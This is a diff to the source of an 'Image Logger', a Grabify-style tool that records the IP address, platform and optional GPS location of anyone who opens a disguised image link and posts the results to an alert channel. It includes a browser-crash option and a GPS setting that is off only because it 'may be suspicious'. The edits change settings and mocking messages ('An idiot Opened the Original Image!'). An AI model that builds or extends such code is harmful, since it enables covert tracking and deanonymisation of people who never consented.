@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS lol)
     
-    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
@@ -101,13 +101,13 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Yeh its grabify",
             "color": config["color"],
-            "description": f"Grabify link sent.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"Grabify link sent",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@here"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**An idiot Opened the Original Image!**
 
 **Endpoint:** `{endpoint}`
             
